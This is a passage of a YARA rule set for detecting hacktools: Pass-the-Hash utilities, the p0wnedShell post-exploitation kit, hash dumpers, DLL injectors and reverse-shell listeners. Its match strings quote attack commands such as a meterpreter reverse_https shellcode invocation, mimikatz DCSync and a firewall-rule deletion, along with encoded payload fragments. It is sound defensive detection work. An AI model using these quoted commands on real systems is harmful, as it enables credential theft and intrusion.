      hash2 = "4df9f8804e220eed74e25a075481bb949a6a5ae31ccd09c893b1e0ac4020a9b0"
   strings:
      $s1 = "c:\\debug.txt" fullword ascii
      $s2 = "pth.dll" fullword ascii
      $s3 = "\"Primary\" string found at %.8Xh" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 2 of them )
}

rule PTH_TK_RAR {
   meta:
      description = "PassTheHash Toolkit CoreSecurity - file pshtoolkit_v1.4.rar"
      author = "Florian Roth"
      reference = "https://www.coresecurity.com/corelabs-research-special/open-source-tools/pass-hash-toolkit"
      date = "2016-12-06"
      hash1 = "ff12c81de4d54d19f3b04e11f7d2f8c6998eed8c83149544d16e25771e371d3d"
   strings:
      $x1 = "pshtoolkit_v1.4\\genhash" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 500KB and all of them )
}

rule PTH_TK_1_genhash {
   meta:
      description = "PassTheHash Toolkit CoreSecurity - file genhash.exe"
      author = "Florian Roth"
      reference = "https://www.coresecurity.com/corelabs-research-special/open-source-tools/pass-hash-toolkit"
      date = "2016-12-06"
      hash1 = "113df11063f8634f0d2a28e0b0e3c2b1f952ef95bad217fd46abff189be5373f"
   strings:
      $x1 = "genhash.exe <password>" fullword ascii
      $x2 = "This tool generates LM and NT hashes." fullword ascii
      $x3 = "(hashes format: LM Hash:NT hash)" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule PTH_TK_1_whosthere {
   meta:
      description = "PassTheHash Toolkit CoreSecurity - file whosthere.exe"
      author = "Florian Roth"
      reference = "https://www.coresecurity.com/corelabs-research-special/open-source-tools/pass-hash-toolkit"
      date = "2016-12-06"
      hash1 = "d7a82204d3e511cf5af58eabdd6e9757c5dd243f9aca3999dc0e5d1603b1fa37"
   strings:
      $x1 = "WHOSTHERE v1." ascii
      $x2 = "dump output to a file, -o filename" fullword ascii
      $x3 = "Error: Cannot open LSASS.EXE!." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule HernanOchoa_Hacktool {
   meta:
      description = "PassTheHash Toolkit CoreSecurity and WCE Password Dumper"
      author = "Florian Roth"
      reference = "https://www.coresecurity.com/corelabs-research-special/open-source-tools/pass-hash-toolkit"
      date = "2016-12-06"
      hash1 = "8a8fcce649259f1b670bb1d996f0d06f6649baa8eed60db79b2c16ad22d14231"
   strings:
      $x1 = "by Hernan Ochoa" fullword ascii
      $x2 = "administrator:mydomain:0102030405060708090A0B0C0D0E0F10:0102030405060708090A0B0C0D0E0F10" ascii
      $x3 = "An error was encountered when trying to change the current logon credentials!." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule PTH_TK_1_iamdll {
   meta:
      description = "PassTheHash Toolkit CoreSecurity - file iamdll.dll"
      author = "Florian Roth"
      reference = "https://www.coresecurity.com/corelabs-research-special/open-source-tools/pass-hash-toolkit"
      date = "2016-12-06"
      hash1 = "892de92f71941f7b9e550de00a57767beb7abe1171562e29428b84988cee6602"
   strings:
      $s1 = "LSASRV.DLL" fullword ascii
      $s2 = "iamdll.dll" fullword ascii
      $s3 = "ChangeCreds" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 70KB and all of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-12-12
   Identifier: TK - Incident
*/

/* Rule Set ----------------------------------------------------------------- */

rule Unknown_Password_Dumper_TK1 {
   meta:
      description = "Detects unknown password dumper"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-12-12"
      hash1 = "52f05c26ca92b942fb3b1966e187e0fcbd8afba3d7e03c1c5b65e1a5010546f8"
   strings:
      $x1 = "c:\\windows\\sysvol\\sysvol\\mfa.gov.tr\\DfsrPrivate\\Installing\\Installing.xml" fullword ascii
      $x2 = "Username:%S--->Password:%S" fullword ascii

      $s1 = "AdLdap.dll" fullword ascii
      $s2 = "[-]:Fopen files error" fullword ascii
      $s3 = "rassfm" fullword ascii
      $s4 = "qwertyui12345671" fullword ascii
      $s5 = "InitHooking" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and $x1 ) or ( 3 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-01-06
   Identifier: Fscan
*/

/* Rule Set ----------------------------------------------------------------- */

rule Fscan_Portscanner {
   meta:
      description = "Fscan port scanner scan output / strings"
      author = "Florian Roth"
      reference = "https://twitter.com/JamesHabben/status/817112447970480128"
      date = "2017-01-06"
   strings:
      $s1 = "Time taken:" fullword ascii
      $s2 = "Scan finished at" fullword ascii
      $s3 = "Scan started at" fullword ascii
   condition:
      filesize < 20KB and 2 of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-01-14
   Identifier: p0wnedShell
*/

/* Rule Set ----------------------------------------------------------------- */

rule p0wnedPowerCat {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPowerCat.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "6a3ba991d3b5d127c4325bc194b3241dde5b3a5853b78b4df1bce7cbe87c0fdf"
   strings:
      $x1 = "Now if we point Firefox to http://127.0.0.1" fullword ascii
      $x2 = "powercat -l -v -p" fullword ascii
      $x3 = "P0wnedListener" fullword ascii
      $x4 = "EncodedPayload.bat" fullword ascii
      $x5 = "powercat -c " fullword ascii
      $x6 = "Program.P0wnedPath()" ascii
      $x7 = "Invoke-PowerShellTcpOneLine" fullword ascii
   condition:
      ( uint16(0) == 0x7375 and filesize < 150KB and 1 of them ) or ( 2 of them )
}

rule Hacktool_Strings_p0wnedShell {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedShell.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "e1f35310192416cd79e60dba0521fc6eb107f3e65741c344832c46e9b4085e60"
   strings:
      $x1 = "Invoke-TokenManipulation" fullword ascii
      $x2 = "windows/meterpreter" fullword ascii
      $x3 = "lsadump::dcsync" fullword ascii
      $x4 = "p0wnedShellx86" fullword ascii
      $x5 = "p0wnedShellx64" fullword ascii
      $x6 = "Invoke_PsExec()" fullword ascii
      $x7 = "Invoke-Mimikatz" fullword ascii
      $x8 = "Invoke_Shellcode()" fullword ascii
      $x9 = "Invoke-ReflectivePEInjection" ascii
   condition:
      1 of them
}

rule p0wnedPotato {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPotato.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "aff2b694a01b48ef96c82daf387b25845abbe01073b76316f1aab3142fdb235b"
   strings:
      $x1 = "Invoke-Tater" fullword ascii
      $x2 = "P0wnedListener.Execute(WPAD_Proxy);" fullword ascii
      $x3 = " -SpooferIP " ascii
      $x4 = "TaterCommand()" ascii
      $x5 = "FileName = \"cmd.exe\"," fullword ascii
   condition:
      1 of them
}

rule p0wnedExploits {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedExploits.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "54548e7848e742566f5596d8f02eca1fd2cbfeae88648b01efb7bab014b9301b"
   strings:
      $x1 = "Pshell.RunPSCommand(Whoami);" fullword ascii
      $x2 = "If succeeded this exploit should popup a System CMD Shell" fullword ascii
   condition:
      all of them
}

rule p0wnedShellx64 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedShellx64.exe"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "d8b4f5440627cf70fa0e0e19e0359b59e671885f8c1855517211ba331f48c449"
   strings:
      $x1 = "Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9Pjgb/+kPPhv9Sjp01Wf" wide
      $x2 = "Invoke-TokenManipulation" wide
      $x3 = "-CreateProcess \"cmd.exe\" -Username \"nt authority\\system\"" fullword wide
      $x4 = "CommandShell with Local Administrator privileges :)" fullword wide
      $x5 = "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " fullword wide
   condition:
      1 of them
}

rule p0wnedListenerConsole {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedListenerConsole.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "d2d84e65fad966a8556696fdaab5dc8110fc058c9e9caa7ea78aa00921ae3169"
   strings:
      $x1 = "Invoke_ReflectivePEInjection" fullword wide
      $x5 = "p0wnedShell> " fullword wide
      $x6 = "Resources.Get_PassHashes" fullword wide
      $s7 = "Invoke_CredentialsPhish" fullword wide
      $s8 = "Invoke_Shellcode" fullword wide
      $s9 = "Resources.Invoke_TokenManipulation" fullword wide
      $s10 = "Resources.Port_Scan" fullword wide
      $s20 = "Invoke_PowerUp" fullword wide
   condition:
      1 of them
}

rule p0wnedBinaries {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedBinaries.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "fd7014625b58d00c6e54ad0e587c6dba5d50f8ca4b0f162d5af3357c2183c7a7"
   strings:
      $x1 = "Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9" ascii
      $x2 = "wpoWAB+LCAAAAAAABADs/QeyK7uOBYhORUNIenL+E2vBA0ympH3erY4f8Tte3TpbUiY9YRbcGK91vVKtr+tV3v/B/yr/m1vD/+DvNOVb+V/f" ascii
      $x3 = "mo0MAB+LCAAAAAAABADsXQl24zqu3YqXII6i9r+xJ4AACU4SZcuJnVenf/9OxbHEAcRwcQGu62NbHsrax/Iw+3/hP5b+VzuH/4WfVeDf8n98" ascii
      $x4 = "LE4CAB+LCAAAAAAABADsfQmW2zqu6Fa8BM7D/jf2hRmkKNuVm/Tt9zunkipb4giCIGb2/prhFUt5hVe+/sNP4b+pVvwPn+OQp/LT9ge/+" ascii
      $x5 = "XpMCAB+LCAAAAAAABADsfQeWIzmO6FV0hKAn73+xL3iAwVAqq2t35r/tl53VyhCDFoQ3Y7zW9Uq1vq5Xef/CT+X/59bwFz6nKU/lp+8P/" ascii
      $x6 = "STwAAB+LCAAAAAAABADtWwmy6yoO3YqXgJjZ/8ZaRwNgx/HNfX/o7qqUkxgzCM0SmLR2jHBQzkc4En9xZbvHUuSLMnWv9ateK/70ilStR" ascii
      $x7 = "namespace p0wnedShell" fullword ascii
   condition:
      1 of them
}

rule p0wnedAmsiBypass {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedAmsiBypass.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "345e8e6f38b2914f4533c4c16421d372d61564a4275537e674a2ac3360b19284"
   strings:
      $x1 = "Program.P0wnedPath()" fullword ascii
      $x2 = "namespace p0wnedShell" fullword ascii
      $x3 = "H4sIAAAAAAAEAO1YfXRUx3WflXalFazQgiVb5nMVryzxIbGrt/rcFRZIa1CQYEFCQnxotUhP2pX3Q337HpYotCKrPdbmoQQnkOY0+BQCNKRpe" ascii
   condition:
      1 of them
}

rule p0wnedShell_outputs {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - from files p0wnedShell.cs, p0wnedShell.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      super_rule = 1
      hash1 = "e1f35310192416cd79e60dba0521fc6eb107f3e65741c344832c46e9b4085e60"
   strings:
      $s1 = "[+] For this attack to succeed, you need to have Admin privileges." fullword ascii
      $s2 = "[+] This is not a valid hostname, please try again" fullword ascii
      $s3 = "[+] First return the name of our current domain." fullword ascii
   condition:
      1 of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-02
   Identifier: Hashdump
*/

/* Rule Set ----------------------------------------------------------------- */

rule Hashdump_Hacktool_1 {
   meta:
      description = "Detects Hashdump hacktool"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-02"
      hash1 = "d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674"
   strings:
      $x1 = "\\Release\\hashdump.pdb" ascii
      $x2 = "--dump-hash-domain --with-history" fullword ascii
      $x3 = "hashdump.exe <options>" fullword ascii
      $x4 = "--------------------------------------------- BEGIN DUMP --------------------------------------------" fullword ascii
      $x5 = "%d dumped accounts to %s" fullword ascii
      $x6 = "--dump-hash-domain (NTDS_FILE must be specified)" fullword ascii
      $x7 = "[+] Processing hashes deciphering..." fullword ascii

      $s1 = "%s_hist%d:\"\":\"\":%s:%s" fullword ascii
      $s2 = "\\SAM\\Domains\\Account\\Users\\Names" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of ($x*) or 2 of them ) or ( 4 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-01-26
   Identifier: Ebowla
*/

/* Rule Set ----------------------------------------------------------------- */

rule Ebowla_Golang_EXE_Supicious_1 {
   meta:
      description = "Detects suspicious compiled Golang Executable with certain imports"
      author = "Florian Roth"
      reference = "https://goo.gl/oCPFmY"
      score = 50
      date = "2017-01-26"
   strings:
      $s1 = "runtime.aeshash64" ascii
      $s2 = "type..hash.runtime.sweepdata" ascii
      $s3 = "crypto/cipher.NewCFBDecrypter" ascii
      $s4 = "crypto/cipher.xorBytes" ascii
      $s5 = ".hash.reflect.Method" ascii

      $a1 = "encoding/hex.InvalidByteError.Error" ascii
      $a2 = "encoding/hex.DecodeString" ascii
      $a3 = "reflect.resolveReflectName" ascii

      $fp1 = "SteelSeries Engine" ascii wide
   condition:
      ( uint16(0) == 0x5a4d and all of them and not 1 of ($fp*) )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-01-29
   Identifier: Generic Command Line Hacking Tools
*/

/* Rule Set ----------------------------------------------------------------- */

rule Generic_Strings_Hacktools {
   meta:
      description = "Detects suspicious strings used in command line hack tools"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 60
   strings:
      $c1 = "[+] " ascii
      $c2 = "[-] " ascii
      $c3 = "[*] " ascii

      $s1 = "injected" ascii fullword
      $s2 = "injecting" ascii fullword
      $s3 = "exploit" ascii fullword
      $s4 = "dumped" ascii fullword
      $s5 = "dumping" ascii fullword
      $s6 = "scanning" ascii fullword
      $s7 = "scanned" ascii fullword
      $s8 = "elevation" ascii fullword
      $s9 = "elevated" ascii fullword
      $s10 = "payload" fullword ascii
      $s11 = "vulnerable" fullword ascii
      $s12 = "payload" fullword ascii
      $s13 = "reverse connect" fullword ascii
      $s14 = "bind shell" fullword ascii
      $s15 = "reverse shell" fullword ascii
      $s16 = " dump " ascii
      $s17 = " back connect " ascii
      $s18 = "privesc" fullword ascii
      $s19 = "privilege escalat" ascii
      $s20 = "debug privilege" ascii
      $s21 = " inject " ascii
      $s22 = "interactive shell" ascii fullword
      $s23 = "shell commands" ascii fullword
      $s24 = " spawning " ascii

      $ss1 = "] target " ascii
      $ss2 = "] Transmi" ascii
      $ss3 = "] Connect" ascii
      $ss4 = "] connect" ascii
      $ss5 = "] Dump" ascii
      $ss6 = "] command " ascii
      $ss7 = "] token" ascii
      $ss8 = "] Token " ascii
      $ss9 = "] Firing " ascii

      $sf1 = " hashes " ascii
      $sf2 = " etc/passwd" ascii
      $sf3 = " SAM " ascii
      $sf4 = " NTML" ascii
      $sf5 = "unsupported target" fullword ascii
      $sf6 = "race condition" fullword ascii
      $sf8 = "Token system " ascii
      $sf9 = "LoaderConfig" fullword ascii
      $sf10 = " add user " ascii
      $sf11 = "ile upload " ascii
      $sf12 = "ile download " ascii
      $sf13 = "Attaching to " ascii
      $sf14 = "ser has been successfully added" ascii
      $sf15 = "target system " ascii
      $sf16 = "LSA Secrets" fullword ascii
      $sf17 = "DefaultPassword" fullword ascii
      $sf18 = "Password: " ascii
      $sf19 = "loading dll" ascii

      $sc1 = "Injected" ascii fullword
      $sc2 = "Injecting" ascii fullword
      $sc3 = "Exploit" ascii fullword
      $sc4 = "Dumping" ascii fullword
      $sc5 = "Scanning" ascii fullword
      $sc6 = "Elevated" ascii fullword
      $sc7 = "Payload" fullword ascii
      $sc8 = "Vulnerable" fullword ascii
      $sc9 = " Spawning " ascii
      $sc10 = "Target system " ascii

      $sr1 = / MS1[3-7]\-0/ ascii

      $fp1 = "Incorrect command line" fullword ascii
      $fp2 = "JAVADUMP" fullword ascii
      $fp3 = "free software" fullword ascii
      $fp4 = "PlaySound" fullword ascii
      $fp5 = "Dell Inc." fullword ascii
      $fp6 = "CryptLib session" fullword ascii
      $fp7 = "Transform Position" fullword ascii
		$fp8 = "VIPRE Advanced Active Protection Service" wide fullword
		$fp9 = "Bitdefender - Removal Tool" wide fullword
		$fp10 = "AVCProxy.exe" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and 1 of ($c*) and 1 of ($s*) and not 1 of ($fp*)
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-01-29
   Identifier: Hacktools Jan 2017
*/

/* Rule Set ----------------------------------------------------------------- */

rule Hacktool_dllinjector {
   meta:
      description = "Hacktool VT Research - file dllinjector.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      hash1 = "69e1d048afeea540f3a848f0f6c11fd5f234bf93686a7ae1f0f9ce77c6e5e884"
      score = 80
   strings:
      $s1 = "[-] Injecting \"%s\" into %s succeeded" fullword ascii
      $s2 = "[****************** DLLInjector ******************]" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and 1 of them ) or 2 of them
}

rule Hacktool_1_EXE {
   meta:
      description = "Hacktool VT Research - file 1.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      hash1 = "89361a46f1b25e300ea03e89f40e0cfc83cac1d0fa905263ac947a56b18310ac"
      score = 70
   strings:
      $s1 = "[-] Stdin pipe creatio" fullword ascii
      $s2 = "(new process: %de4" fullword ascii
      $s3 = "NT AUTHORITYK*" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule Hacktool_dirb {
   meta:
      description = "Hacktool VT Research - file dirb.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      hash1 = "1c9aad114f8d6a6b5795d6842ee226034cca1e650cfb00ff5733a14a808e8eb7"
      score = 80
   strings:
      $s1 = "[++] dump() Dumping Session State AT %s" fullword ascii
      $s2 = "FTP USER PASSWORD INCORRECT" fullword ascii
      $s3 = "<url_base> : Base URL to scan. (Use -resume for session resuming)" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and 2 of them ) or 3 of them
}

rule Hacktool_rootkit_installer {
   meta:
      description = "Hacktool VT Research - file rootkit_installer.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      hash1 = "d5d79212939f3976805b6576795e6689f4cc9fa607565f5491156687fe1dcb91"
      score = 80
   strings:
      $x1 = "cmd.exe /C netsh advfirewall firewall delete rule name=System" fullword ascii
      $x2 = "DllMain(): Injected into process" fullword ascii
      $x3 = "\\WindowsRegistryRootkit\\bin\\" ascii
      $x4 = "InjectFindProcess(): \"%wZ\", PID = %d" fullword ascii
      $x5 = "InjectIntoProcess(): APC delivered!" fullword ascii
      $x6 = "rootkit_driver_debug.sys" fullword ascii
      $x7 = "meterpreter_debug.dll" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and 1 of them ) or 3 of them
}

rule Hacktool_derein_02 {
   meta:
      description = "Hacktool VT Research - file derein-02.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "a3a27fb14baef8aa7e0de58e7001c91818da65f3007b35d7c820dde37f1728dd"
   strings:
      $x1 = "Usage: derein -t [target executable] {Options}" fullword ascii
      $x2 = "[-] Error: %s is not a Portable Executable file." fullword ascii
      $x3 = "-t : [target.exe] - target executable to be packed" fullword ascii
      $x4 = "[+] DEcrypt REcurse INject Executable Packer _v0.2" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them ) or 3 of them
}

rule Hacktool_temp {
   meta:
      description = "Hacktool VT Research - file temp.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "8842fa5817a8c5e5b67536f22ab9b9ae887336c09cb145c85f52c6ff85de2c91"
   strings:
      $s1 = "[*] toServer: %s, toPort: %d" fullword ascii
      $s2 = "[*] Download Failed." fullword ascii
      $s3 = "[*] Extracted random key:" fullword ascii
      $s4 = "[*] Download Start: %s" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 3 of them )
}

rule Hacktool_ProcessHider {
   meta:
      description = "Hacktool VT Research - file ProcessHider.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "e303fef1966e71160d092ce8d918e8bc85e3b448023db4583a437fb933cdfd6f"
   strings:
      $x1 = "\\BuildOutput\\x64Payload.pdb" ascii
      $x2 = "[+] Injected the '%ws' DLL into process %d." fullword ascii
      $x3 = "Failed to open the target process" fullword ascii
      $x4 = "x64Payload.dll" fullword wide
      $x5 = "x86Payload.dll" fullword wide
      $x6 = "x64Hider.exe" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them ) or 3 of them
}

rule Hacktool_inject {
   meta:
      description = "Hacktool VT Research - file inject.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 70
      hash1 = "928e64664e3ff1ca9d3c3225b9af23b040730f934012f9ac340ca9336f261c95"
   strings:
      $x1 = "[+] Injected the '%s' DLL into process %d." fullword ascii
      $x2 = "\\ReflectiveInjection\\" ascii
      $x3 = "Failed to inject the DLL" fullword ascii
      $x4 = "reflective_dll.dll" fullword ascii
      $x5 = "ReflectiveLoader" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 2 of them ) or 3 of them
}

rule Hacktool_httplcx {
   meta:
      description = "Hacktool VT Research - file httplcx.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "628f679af8ef3f6116d7ecbd6efa18459b5aa5ea31f306122ef076d4d85df3e3"
   strings:
      $s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)" fullword ascii
      $s2 = "[+] Make a Connection to %s:%d...." fullword ascii
      $s3 = "[+] Waiting for Client on port:%d ......" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 60KB and 2 of them )
}

rule Hacktool_Client {
   meta:
      description = "Hacktool VT Research - file Client.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 70
      hash1 = "4a647929180e707c19ad24f5fa51572a7d724b02f3721a47d47ce5f1b63f768c"
   strings:
      $s1 = "Client.exe" fullword wide
      $s2 = "Module error" fullword wide
      $s3 = "Debugger detected (Managed)" fullword wide
      $s4 = "Loop broken" fullword wide
      $s5 = "Confuser v1.9.0.0" fullword ascii
      $s6 = "Profiler detected" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and 4 of them )
}

rule Hacktool_sqliscanner {
   meta:
      description = "Hacktool VT Research - file sqliscanner.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "a4a224208df8e6ec38e9199a5c893b0c09807b2e7a662d0820bc30b2fde15280"
   strings:
      $x1 = "greetz for d3hydr8" fullword ascii
      $x2 = "print R+\"\\nw00t!,w00t!:\", O+host, B+\"Error:\", type" fullword ascii
      $x3 = "'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)'," fullword ascii
      $x4 = "header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)'," fullword ascii
      $x5 = "'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)'," fullword ascii
      $x6 = "BindStub.exe" fullword wide
      $x7 = "'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)'," fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 50KB and 4 of them )
}

rule Hacktool_inject_x64 {
   meta:
      description = "Hacktool VT Research - file inject-x64.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "8e11f311142c7dbef2542397c6e73f8ad67e815d0ba102dc5793f9af2333c7ec"
      hash2 = "174a80a6f5c35c18e62a8b2be96144f9cb58ddc1165834f0f639850cd0bdc7b9"
   strings:
      $x1 = "[-] Error injecting remote thread in process: %d" fullword ascii
      $x2 = "--process-name <name>  Process name to inject" fullword ascii
      $x3 = "[-] Both --from and --from-process are specified" fullword ascii
      $x4 = "--pid <pid>            Process identifier to inject" fullword ascii
      $x5 = "[-] No injection target has been provided!" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 90KB and 1 of them ) or ( 2 of them )
}

rule Hacktool_ec0nBnEBs4_meterpreter {
   meta:
      description = "Hacktool VT Research - file ec0nBnEBs4_meterpreter.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "29f6eb1aa4bf201d04d3650f215fb6415a9a41e60f0938da9c21aab89e8ebcef"
      hash2 = "76feaa8c54bd4ec8e5c4d56e7a3581158d9b231d39caa37bec1af2f4213198e4"
   strings:
      $x1 = "[*] Attempting to add user %s to localgroup %s on host %s" fullword ascii
      $x2 = "[-] Operation only allowed on primary domain controller" fullword ascii
      $x3 = "[+] Successfully impersonated user " fullword ascii
      $x4 = "[-] Access denied with all tokens" fullword ascii
      $x5 = "incognito_impersonate_token" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them ) or ( 2 of them )
}

rule Hacktool_lcx5 {
   meta:
      description = "Hacktool VT Research - file lcx5.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "f9e7ba7a774799d9d39b44afca1591a7ea86530063634f42480cf530f085adbb"
   strings:
      $x1 = "=========== Code by lion & bkbll" fullword ascii
      $x2 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii
      $x3 = "-slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
      $x4 = "[-] ERROR: Must supply logfile name." fullword ascii
      $x5 = "[+] OK! I Closed The Two Socket." fullword ascii
      $x6 = "[-] TransmitPort invalid." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30KB and 2 of them ) or ( 4 of them )
}

rule Hacktool_mini_dll_patchdate {
   meta:
      description = "Hacktool VT Research - file mini-dll-patchdate.dll"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "bde3d2d7528abc3ad09bd9521c769156c8412a0005791c647b0d5af1ca5d3d2c"
   strings:
      $x1 = "Perforimng a Shell_TrayWnd injection into explorer.exe" fullword ascii
      $x2 = "InjectToProcessDirect() PID = %d, size = %d" fullword ascii
      $x3 = "cmd.exe bat file was successfully launched" fullword ascii
      $x4 = "mini in unknown context, process name = %s, hash = 0x%x" fullword ascii
      $x5 = "[-] ShellExecute() failed with 0x%x" fullword ascii
      $x6 = "InjectToProcessDirect" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and 1 of them ) or ( 3 of them )
}

rule Hacktool_listner {
   meta:
      description = "Hacktool VT Research - file listner.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "b9f37c8e27bc95c9aa8da4a83951827bba9da1ad49d5042c0e9eb69953569e18"
      hash2 = "6ae7fd1d46b286ae9725fe934ce55fa199dd73ede28e2801d527ba0a2c2c75f2"
   strings:
      $s1 = "Waiting for reverse shell on port TCP %u" fullword ascii
      $s2 = "[-] WSAStartup error: %d " fullword ascii
      $s3 = "Reverse Listner" fullword ascii
      $s4 = "Waiting for reverse shell on port TCP %u" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them ) or ( 2 of them )
}

rule Hacktool_DllInjectorNative {
   meta:
      description = "Hacktool VT Research - file DllInjectorNative.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "5389868fe31e5825357e4040c1fd6e61dc19c92ab73269b587cc85b414793874"
   strings:
      $s1 = "?Not elevated mode, trying RU_" fullword ascii
      $s2 = "DIsAdminMember" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 40KB and all of them )
}

rule Hacktool_ly_down {
   meta:
      description = "Hacktool VT Research - file ly_down.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "f35c02c51d03d57e35b16df8f42d07fb9ff7cae119e1bc70afbfe2860615c8a9"
   strings:
      $s1 = "\\TempKey32.log" fullword wide
      $s2 = "Returns/Sets the name used to identify the remote computer" fullword ascii
